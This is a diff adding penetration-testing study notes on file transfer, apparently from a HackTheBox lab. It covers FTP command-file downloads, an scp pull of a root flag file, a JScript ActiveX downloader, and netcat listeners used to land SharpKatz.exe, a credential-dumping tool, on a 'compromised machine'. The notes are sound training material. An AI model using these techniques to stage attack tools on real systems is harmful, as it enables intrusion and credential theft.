@@ -103,4 +103,58 @@ We can specify the class name Net.WebClient and the method DownloadFile with the
 ## Transferrring Files from an FTP Server
 - PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 
+## Create a Command File for the FTP Client and Download the Target File
+- C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+- C:\htb> echo USER anonymous >> ftpcommand.txt
+- C:\htb> echo binary >> ftpcommand.txt
+- C:\htb> echo GET file.txt >> ftpcommand.txt
+- C:\htb> echo bye >> ftpcommand.txt
+- C:\htb> ftp -v -n -s:ftpcommand.txt
+- ftp> open 192.168.49.128
+- Log in with USER and PASS first.
+- ftp> USER anonymous
+
+- ftp> GET file.txt
+- ftp> bye
+
+- C:\htb>more file.txt
+- This is a test file
+
+# File Transfer and Downloading methods in LINUX
+- echo
+- wget
+- curl
+- exec
+- ssh
+- netstat
+- scp : Aadhaar Koul@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
+- openssl
+
+# Transferring files through Javascript
+JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.
+
+The following JavaScript code is based on this post, and we can download a file using it. We'll create a file called wget.js and save the following content:
+
+- var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+- WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+- WinHttpReq.Send();
+- BinStream = new ActiveXObject("ADODB.Stream");
+- BinStream.Type = 1;
+- BinStream.Open();
+- BinStream.Write(WinHttpReq.ResponseBody);
+- BinStream.SaveToFile(WScript.Arguments(1));
+
+# File transfers using Netcat
+The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.
+
+In this example, we'll transfer SharpKatz.exe from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.
+
+We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename, SharpKatz.exe.
+
+## NetCat - Compromised Machine - Listening on Port 8000
+- victim@target:~$ nc -l -p 8000 > SharpKatz.exe
+
+## Ncat - Compromised Machine - Listening on Port 8000
+- victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
+
 
